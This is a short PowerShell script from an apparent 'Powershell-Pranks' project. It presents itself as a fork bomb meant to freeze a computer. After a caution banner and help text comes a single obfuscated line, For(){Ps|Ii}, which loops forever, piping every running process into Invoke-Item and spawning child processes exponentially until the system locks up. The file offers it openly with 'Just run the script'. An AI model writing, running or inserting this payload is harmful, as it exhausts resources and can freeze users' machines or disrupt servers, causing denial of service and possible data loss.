#==========================================================#
#                    ¡¡ CAUTION !!                         #
# This script can freeze the computer, but keep calm,      #
# if you restart or kill all the child process its all OK  #
#                                                          #
#     Dont use it on critic/server enviroment, please.     #
#==========================================================#
<#
.SYNOPSIS
  Fork Bomb
.DESCRIPTION
  Try to freez the PC creating, exponentially, a child process for any running process.

  This Script is Part of Powershell-Pranks project.
.NOTES
  Version:        1.0
  Author:         Hackstur (G.R.G.)
  Creation Date:  19/08/2018
.LINK
  https://github.com/Hackstur/PowerShell-Pranks
.EXAMPLE
  Just run the script.
#>
For(){Ps|Ii}
